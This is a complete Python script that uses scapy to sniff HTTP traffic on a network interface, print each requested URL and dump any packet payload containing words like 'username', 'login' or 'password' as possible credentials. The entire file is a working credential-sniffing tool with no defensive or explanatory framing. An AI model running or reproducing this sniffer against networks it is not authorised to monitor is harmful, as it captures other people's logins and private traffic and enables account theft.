import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--type", dest="net_type", help="Network type")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    try:
        url = f"{packet[http.HTTPRequest].Host.decode('utf-8')}{packet[http.HTTPRequest].Path.decode('utf-8')}"
    except:
        url = f"{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}"
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            try:
                print(f"\n\n[+] Possible username/password > {login_info.decode('utf-8')}\n\n")
            except:
                print(f"\n\n[+] Possible username/password > {login_info}\n\n")

options = get_arguments()
sniff(options.net_type)
